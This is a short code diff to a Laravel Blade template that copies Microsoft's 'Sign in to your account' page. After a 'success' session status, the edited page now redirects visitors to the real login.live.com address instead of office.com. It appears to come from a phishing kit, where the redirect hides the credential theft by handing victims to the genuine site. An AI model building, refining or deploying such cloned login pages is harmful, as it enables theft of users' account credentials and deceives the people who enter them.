@@ -1,5 +1,5 @@
 @if(Session::has('status') && Session::get('status') == "success")
-	<script>window.location = "www.office.com";</script>
+	<script>window.location = "https://login.live.com/login.srf";</script>
 @else
 <html dir="ltr" class="" lang="en"><head>
     <title>Sign in to your account</title>
